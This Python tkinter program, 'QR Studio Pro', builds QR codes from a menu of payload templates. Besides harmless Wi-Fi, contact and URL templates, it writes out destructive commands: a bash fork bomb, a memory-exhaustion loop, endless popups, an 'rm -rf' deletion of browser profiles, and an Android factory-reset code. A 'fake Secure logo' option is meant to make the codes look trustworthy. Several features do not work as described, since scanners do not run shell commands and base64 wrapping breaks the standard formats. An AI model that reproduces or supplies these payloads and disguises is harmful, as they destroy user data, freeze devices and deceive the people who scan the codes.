import qrcode
import base64
from PIL import Image, ImageDraw, ImageTk
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import os
import random

class ModernQRCodeGenerator:
    def __init__(self, root):
        self.root = root
        self.root.title("QR Studio Pro")
        self.root.geometry("1000x750")
        self.root.configure(bg='#0a0a12')
        self.root.minsize(900, 650)
        
        self.selected_payload = tk.StringVar(value="Custom Command")
        self.flash_intensity = tk.IntVar(value=3)
        self.output_format = tk.StringVar(value="PNG")
        self.qr_logo = tk.BooleanVar(value=False)
        self.qr_color = tk.StringVar(value="#000000")
        self.bg_color = tk.StringVar(value="#FFFFFF")
        
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.generator_tab = ttk.Frame(self.notebook)
        self.preview_tab = ttk.Frame(self.notebook)
        self.info_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.generator_tab, text="QR Generator")
        self.notebook.add(self.preview_tab, text="Preview")
        self.notebook.add(self.info_tab, text="Info & Safety")
        
        self.setup_generator_tab()
        self.setup_preview_tab()
        self.setup_info_tab()
        
        self.preview_image = None
        
    def setup_generator_tab(self):
        main_frame = ttk.Frame(self.generator_tab)
        main_frame.pack(fill='both', expand=True)
        
        canvas = tk.Canvas(main_frame, bg="#0a0a12", highlightthickness=0)
        scrollbar = ttk.Scrollbar(main_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        title_label = tk.Label(scrollable_frame, text="QR Studio Pro", 
                              bg="#0a0a12", fg="#64ffda", font=('Arial', 18, 'bold'))
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 10))
        
        subtitle_label = tk.Label(scrollable_frame, text="Professional QR Code Generator", 
                                 bg="#0a0a12", fg="#f0f0f0", font=('Arial', 11, 'bold'))
        subtitle_label.grid(row=1, column=0, columnspan=2, pady=(0, 20))
        
        warning_label = tk.Label(scrollable_frame, 
                                text="⚠️ WARNING: For educational and authorized testing purposes only!",
                                bg="#0a0a12", fg="#ff6b6b", font=('Arial', 10, 'bold'))
        warning_label.grid(row=2, column=0, columnspan=2, pady=(0, 20))
        
        payload_label = tk.Label(scrollable_frame, text="Payload Template:", 
                                bg="#0a0a12", fg="#f0f0f0", font=('Arial', 11, 'bold'))
        payload_label.grid(row=3, column=0, sticky=tk.W, pady=5)
        
        payloads = [
            "Custom Command",
            "Wi-Fi Credentials",
            "Contact Information",
            "URL Redirect",
            "Phone - Factory Reset",
            "Phone - Silent Mode Activator",
            "Phone - Brightness Maximizer",
            "Phone - Open Emergency Dialer",
            "Phone - Open Security Settings",
            "Phone - Open App Store",
            "Phone - Open Camera",
            "System - Fork Bomb (CPU Overload)",
            "System - Memory Hog (RAM Exhaustion)",
            "System - Endless Popups (UI Freeze)",
            "System - Fake System Update",
            "System - Browser History Wipe",
            "System - Annoying Audio Loop"
        ]
        
        payload_combo = ttk.Combobox(scrollable_frame, textvariable=self.selected_payload, 
                                    values=payloads, state="readonly", width=40)
        payload_combo.grid(row=3, column=1, sticky=(tk.W, tk.E), pady=5, padx=(10, 0))
        payload_combo.bind('<<ComboboxSelected>>', self.update_payload_description)
        
        self.desc_label = tk.Label(scrollable_frame, text="", wraplength=600, 
                                  bg="#0a0a12", fg="#c0c0c0", font=('Arial', 10))
        self.desc_label.grid(row=4, column=0, columnspan=2, pady=(5, 15))
        
        custom_label = tk.Label(scrollable_frame, text="Custom Payload:", 
                               bg="#0a0a12", fg="#f0f0f0", font=('Arial', 11, 'bold'))
        custom_label.grid(row=5, column=0, sticky=tk.W, pady=5)
        
        self.custom_payload = scrolledtext.ScrolledText(scrollable_frame, height=6, width=60, 
                                                       bg="#1a1a2e", fg="#64ffda", insertbackground="#64ffda")
        self.custom_payload.grid(row=5, column=1, sticky=(tk.W, tk.E), pady=5, padx=(10, 0))
        self.custom_payload.insert("1.0", "echo 'QR Code Executed'")
        
        options_frame = tk.LabelFrame(scrollable_frame, text="QR Code Options", 
                                     bg="#0a0a12", fg="#64ffda", font=('Arial', 10, 'bold'))
        options_frame.grid(row=6, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=15)
        
        intensity_label = tk.Label(options_frame, text="Flash Intensity:", 
                                  bg="#0a0a12", fg="#c0c0c0", font=('Arial', 10))
        intensity_label.grid(row=0, column=0, sticky=tk.W)
        intensity_scale = ttk.Scale(options_frame, from_=1, to=10, variable=self.flash_intensity, 
                                   orient=tk.HORIZONTAL)
        intensity_scale.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(10, 0))
        
        format_label = tk.Label(options_frame, text="Output Format:", 
                               bg="#0a0a12", fg="#c0c0c0", font=('Arial', 10))
        format_label.grid(row=1, column=0, sticky=tk.W, pady=(10, 0))
        format_frame = tk.Frame(options_frame, bg="#0a0a12")
        format_frame.grid(row=1, column=1, sticky=tk.W, pady=(10, 0), padx=(10, 0))
        
        png_radio = tk.Radiobutton(format_frame, text="PNG", variable=self.output_format, value="PNG",
                                  bg="#0a0a12", fg="#64ffda", selectcolor="#1a1a2e")
        png_radio.pack(side=tk.LEFT)
        
        gif_radio = tk.Radiobutton(format_frame, text="GIF", variable=self.output_format, value="GIF",
                                  bg="#0a0a12", fg="#64ffda", selectcolor="#1a1a2e")
        gif_radio.pack(side=tk.LEFT)
        
        color_label = tk.Label(options_frame, text="QR Color:", 
                              bg="#0a0a12", fg="#c0c0c0", font=('Arial', 10))
        color_label.grid(row=2, column=0, sticky=tk.W, pady=(10, 0))
        color_frame = tk.Frame(options_frame, bg="#0a0a12")
        color_frame.grid(row=2, column=1, sticky=tk.W, pady=(10, 0), padx=(10, 0))
        
        colors = ["#000000", "#FF0000", "#00FF00", "#0000FF", "#FF00FF", "#00FFFF", "#FFA500"]
        color_combo = ttk.Combobox(color_frame, textvariable=self.qr_color, values=colors, 
                                  state="readonly", width=10)
        color_combo.pack(side=tk.LEFT)
        
        bg_color_label = tk.Label(options_frame, text="BG Color:", 
                                 bg="#0a0a12", fg="#c0c0c0", font=('Arial', 10))
        bg_color_label.grid(row=3, column=0, sticky=tk.W, pady=(10, 0))
        bg_color_frame = tk.Frame(options_frame, bg="#0a0a12")
        bg_color_frame.grid(row=3, column=1, sticky=tk.W, pady=(10, 0), padx=(10, 0))
        
        bg_colors = ["#FFFFFF", "#000000", "#F0F0F0", "#FFFF00", "#FFCCCB", "#ADD8E6"]
        bg_color_combo = ttk.Combobox(bg_color_frame, textvariable=self.bg_color, values=bg_colors, 
                                     state="readonly", width=10)
        bg_color_combo.pack(side=tk.LEFT)
        
        logo_check = tk.Checkbutton(options_frame, text="Add Fake 'Secure' Logo", variable=self.qr_logo,
                                   bg="#0a0a12", fg="#64ffda", selectcolor="#1a1a2e")
        logo_check.grid(row=4, column=0, columnspan=2, sticky=tk.W, pady=(10, 0))
        
        button_frame = tk.Frame(scrollable_frame, bg="#0a0a12")
        button_frame.grid(row=7, column=0, columnspan=2, pady=20)
        
        generate_btn = tk.Button(button_frame, text="Generate QR Code", command=self.generate_qr,
                                bg="#1a1a2e", fg="#64ffda", font=('Arial', 10, 'bold'),
                                relief="raised", bd=2)
        generate_btn.pack(side=tk.LEFT, padx=5)
        
        save_btn = tk.Button(button_frame, text="Save QR Code", command=self.save_qr,
                            bg="#1a1a2e", fg="#64ffda", font=('Arial', 10, 'bold'),
                            relief="raised", bd=2)
        save_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = tk.Button(button_frame, text="Clear", command=self.clear_fields,
                             bg="#1a1a2e", fg="#64ffda", font=('Arial', 10, 'bold'),
                             relief="raised", bd=2)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        exit_btn = tk.Button(button_frame, text="Exit", command=self.root.quit,
                            bg="#1a1a2e", fg="#64ffda", font=('Arial', 10, 'bold'),
                            relief="raised", bd=2)
        exit_btn.pack(side=tk.LEFT, padx=5)
        
        self.status_label = tk.Label(scrollable_frame, text="Ready to generate professional QR codes", 
                                    bg="#0a0a12", fg="#64ffda", font=('Arial', 10))
        self.status_label.grid(row=8, column=0, columnspan=2, pady=10)
        
        scrollable_frame.columnconfigure(1, weight=1)
        options_frame.columnconfigure(1, weight=1)
        
        self.update_payload_description()
    
    def setup_preview_tab(self):
        preview_frame = tk.Frame(self.preview_tab, bg="#0a0a12")
        preview_frame.pack(fill='both', expand=True)
        
        title = tk.Label(preview_frame, text="QR Code Preview", 
                        bg="#0a0a12", fg="#64ffda", font=('Arial', 18, 'bold'))
        title.pack(pady=(0, 15))
        
        self.preview_container = tk.Frame(preview_frame, bg="#0a0a12")
        self.preview_container.pack(pady=20)
        
        self.preview_label = tk.Label(self.preview_container, text="No QR code generated yet", 
                                     bg="#0a0a12", fg="#c0c0c0", font=('Arial', 10))
        self.preview_label.pack()
        
        info_frame = tk.LabelFrame(preview_frame, text="QR Code Details", 
                                  bg="#0a0a12", fg="#64ffda", font=('Arial', 10, 'bold'))
        info_frame.pack(pady=10, fill='both', expand=True, padx=20)
        
        self.code_info = scrolledtext.ScrolledText(info_frame, height=8, width=70, 
                                                  bg="#1a1a2e", fg="#64ffda", state="disabled")
        self.code_info.pack(pady=10, padx=10, fill='both', expand=True)
    
    def setup_info_tab(self):
        info_frame = tk.Frame(self.info_tab, bg="#0a0a12")
        info_frame.pack(fill='both', expand=True)
        
        title = tk.Label(info_frame, text="QR Code Safety Information", 
                        bg="#0a0a12", fg="#64ffda", font=('Arial', 18, 'bold'))
        title.pack(pady=(0, 15))
        
        info_text = """
        IMPORTANT WARNINGS:
        
        1. NEVER scan unknown QR codes with your personal devices
        2. This tool is for educational and authorized testing purposes only
        3. Malicious QR codes can compromise your device security
        4. Some QR codes can trigger actions without your consent
        
        HOW TO STAY SAFE:
        
        • Use a QR scanner app that previews URLs before opening them
        • Don't scan QR codes from untrusted sources
        • Keep your device's operating system and apps updated
        • Use security software on your devices
        
        HOW MALICIOUS QR CODES WORK:
        
        QR codes can contain:
        • URLs that lead to phishing websites
        • Commands that trigger actions on your device
        • Pre-filled email or SMS messages
        • WiFi network credentials that connect you to malicious networks
        • Contact information that could be used for spam
        
        LEGAL NOTICE:
        
        Creating malicious QR codes with intent to harm devices or steal information is illegal 
        in most jurisdictions. This tool is intended for educational purposes only to demonstrate 
        potential security risks.
        """
        
        info_widget = scrolledtext.ScrolledText(info_frame, height=25, width=80, 
                                               bg="#1a1a2e", fg="#64ffda")
        info_widget.insert("1.0", info_text)
        info_widget.configure(state="disabled")
        info_widget.pack(pady=10, padx=20, fill='both', expand=True)
    
    def update_payload_description(self, event=None):
        selection = self.selected_payload.get()
        descriptions = {
            "Custom Command": "Execute a custom command of your choice.",
            "Wi-Fi Credentials": "Share Wi-Fi network credentials (SSID and password).",
            "Contact Information": "Encode contact information (vCard format).",
            "URL Redirect": "Redirect to a specific URL when scanned.",
            "Phone - Factory Reset": "WARNING: This payload attempts to trigger a factory reset on Android devices.",
            "Phone - Silent Mode Activator": "Sets the phone to silent mode (Android intent).",
            "Phone - Brightness Maximizer": "Sets screen brightness to maximum level.",
            "Phone - Open Emergency Dialer": "Opens the emergency dialer on the phone.",
            "Phone - Open Security Settings": "Opens security settings on the device.",
            "Phone - Open App Store": "Redirects to the app store (Google Play or Apple App Store).",
            "Phone - Open Camera": "Opens the camera app on the device.",
            "System - Fork Bomb (CPU Overload)": "Creates processes recursively to overload CPU.",
            "System - Memory Hog (RAM Exhaustion)": "Allocates memory repeatedly to exhaust system RAM.",
            "System - Endless Popups (UI Freeze)": "Generates endless dialog boxes to freeze the user interface.",
            "System - Fake System Update": "Displays a fake system update screen to trick the user.",
            "System - Browser History Wipe": "Clears browser history and cookies.",
            "System - Annoying Audio Loop": "Plays an annoying sound in a continuous loop."
        }
        
        self.desc_label.config(text=descriptions.get(selection, ""))
        
        if selection != "Custom Command":
            self.custom_payload.delete("1.0", tk.END)
            self.custom_payload.insert("1.0", self.get_payload_for_type(selection))
    
    def get_payload_for_type(self, payload_type):
        payloads = {
            "Custom Command": "echo 'QR Code Executed'",
            "Wi-Fi Credentials": "WIFI:S:MyNetwork;T:WPA;P:MyPassword;;",
            "Contact Information": "BEGIN:VCARD\nVERSION:3.0\nN:Lastname;Firstname\nORG:Company\nTEL:1234567890\nEMAIL:email@example.com\nEND:VCARD",
            "URL Redirect": "https://example.com",
            "Phone - Factory Reset": "*2767*3855#",  # Android factory reset code (may not work on all devices)
            "Phone - Silent Mode Activator": "intent://settings/ringtone#Intent;scheme=android;end",
            "Phone - Brightness Maximizer": "intent://settings/display#Intent;scheme=android;end",
            "Phone - Open Emergency Dialer": "tel:911",
            "Phone - Open Security Settings": "intent://settings/security#Intent;scheme=android;end",
            "Phone - Open App Store": "market://details?id=com.example.app",
            "Phone - Open Camera": "intent://capture#Intent;scheme=android;end",
            "System - Fork Bomb (CPU Overload)": ":(){ :|:& };:",
            "System - Memory Hog (RAM Exhaustion)": "python -c 'while True: bytearray(512 * 1024 * 1024)'",
            "System - Endless Popups (UI Freeze)": "while true; do zenity --info --text='System Warning!'; done",
            "System - Fake System Update": "echo 'Installing system update 1 of 284...' && sleep 5",
            "System - Browser History Wipe": "rm -rf ~/.mozilla/firefox/* && rm -rf ~/.config/google-chrome/*",
            "System - Annoying Audio Loop": "while true; do paplay /usr/share/sounds/gnome/default/alerts/drip.ogg; done"
        }
        return payloads.get(payload_type, "echo 'No payload defined'")
    
    def generate_qr(self):
        payload = self.custom_payload.get("1.0", tk.END).strip()
        
        if not payload:
            messagebox.showerror("Error", "Please enter a payload")
            return
            
        try:
            encoded_payload = base64.b64encode(payload.encode()).decode()
            
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            qr.add_data(encoded_payload)
            qr.make(fit=True)
            
            qr_img = qr.make_image(fill_color=self.qr_color.get(), back_color=self.bg_color.get()).convert('RGB')
            

            if self.qr_logo.get():
                qr_img = self.add_logo(qr_img)
            
            self.add_flashing_effect(qr_img, payload)
            
            self.status_label.config(text="QR Code generated successfully!", fg="#64ffda")
            
            preview = qr_img.resize((250, 250), Image.Resampling.LANCZOS)
            
            self.preview_image = ImageTk.PhotoImage(preview)
            self.preview_label.configure(image=self.preview_image)
            self.preview_label.image = self.preview_image
            
            self.update_code_info(payload, encoded_payload)
            
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {str(e)}")
            self.status_label.config(text="Error generating QR code", fg="#ff6b6b")
    
    def add_logo(self, qr_img):
        """Add a fake security logo to make the QR code look legitimate"""
        try:
            logo_size = min(qr_img.size) // 4
            logo = Image.new('RGBA', (logo_size, logo_size), (0, 0, 0, 0))
            draw = ImageDraw.Draw(logo)
            
            draw.rectangle([logo_size//4, 0, 3*logo_size//4, logo_size], fill=(0, 100, 200, 255))
            draw.polygon([(0, logo_size//3), (logo_size//2, 0), (logo_size, logo_size//3), 
                         (logo_size, 2*logo_size//3), (logo_size//2, logo_size), (0, 2*logo_size//3)], 
                         fill=(0, 150, 255, 255))
            
            draw.line([(logo_size//3, logo_size//2), (logo_size//2, 2*logo_size//3), 
                      (2*logo_size//3, logo_size//3)], fill=(255, 255, 255, 255), width=3)
            
            qr_width, qr_height = qr_img.size
            logo_x = (qr_width - logo_size) // 2
            logo_y = (qr_height - logo_size) // 2
            
            qr_img.paste(logo, (logo_x, logo_y), logo)
            
            return qr_img
        except:
            return qr_img
    
    def add_flashing_effect(self, qr_img, payload):
        images = []
        intensity = self.flash_intensity.get()
        
        for i in range(5):
            flash_img = qr_img.copy()
            
            if i % 2 == 0:
                draw = ImageDraw.Draw(flash_img)
                for y in range(0, flash_img.height, max(1, 20 - intensity)):
                    draw.line((0, y, flash_img.width, y), fill='red', width=2)
            
            images.append(flash_img)
        
        if self.output_format.get() == "GIF":
            images[0].save('secure_qr_code.gif',
                          save_all=True,
                          append_images=images[1:],
                          duration=200,
                          loop=0)
        else:
            for i, img in enumerate(images):
                img.save(f'secure_qr_code_{i}.png')
    
    def save_qr(self):
        if not hasattr(self, 'preview_image') or self.preview_image is None:
            messagebox.showerror("Error", "No QR code to save. Please generate one first.")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".png",
            filetypes=[("PNG files", "*.png"), ("GIF files", "*.gif"), ("All files", "*.*")],
            title="Save QR Code"
        )
        
        if file_path:
            try:
                if self.output_format.get() == "GIF" and os.path.exists("secure_qr_code.gif"):
                    with open("secure_qr_code.gif", "rb") as src, open(file_path, "wb") as dst:
                        dst.write(src.read())
                elif os.path.exists("secure_qr_code_0.png"):
                    with open("secure_qr_code_0.png", "rb") as src, open(file_path, "wb") as dst:
                        dst.write(src.read())
                
                messagebox.showinfo("Success", f"QR code saved successfully to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save QR code: {str(e)}")
    
    def update_code_info(self, payload, encoded_payload):
        self.code_info.configure(state="normal")
        self.code_info.delete("1.0", tk.END)
        
        info_text = f"""
        QR Code Information:
        
        Payload Type: {self.selected_payload.get()}
        
        Original Payload:
        {payload}
        
        Base64 Encoded:
        {encoded_payload}
        
        Files Generated:
        {'secure_qr_code.gif' if self.output_format.get() == 'GIF' else 'secure_qr_code_0.png to secure_qr_code_4.png'}
        
        WARNING: This QR code is for educational purposes only!
        Do not use it to harm others' devices or without explicit permission.
        """
        
        self.code_info.insert("1.0", info_text)
        self.code_info.configure(state="disabled")
    
    def clear_fields(self):
        self.custom_payload.delete("1.0", tk.END)
        self.custom_payload.insert("1.0", "echo 'QR Code Executed'")
        self.selected_payload.set("Custom Command")
        self.flash_intensity.set(3)
        self.output_format.set("PNG")
        self.qr_logo.set(False)
        self.qr_color.set("#000000")
        self.bg_color.set("#FFFFFF")
        self.status_label.config(text="Fields cleared", fg="#64ffda")
        
        if hasattr(self, 'preview_image'):
            self.preview_label.configure(image='')
            self.preview_label.config(text="No QR code generated yet")
        
        self.code_info.configure(state="normal")
        self.code_info.delete("1.0", tk.END)
        self.code_info.configure(state="disabled")
        self.update_payload_description()

if __name__ == "__main__":
    root = tk.Tk()
    app = ModernQRCodeGenerator(root)
    root.mainloop()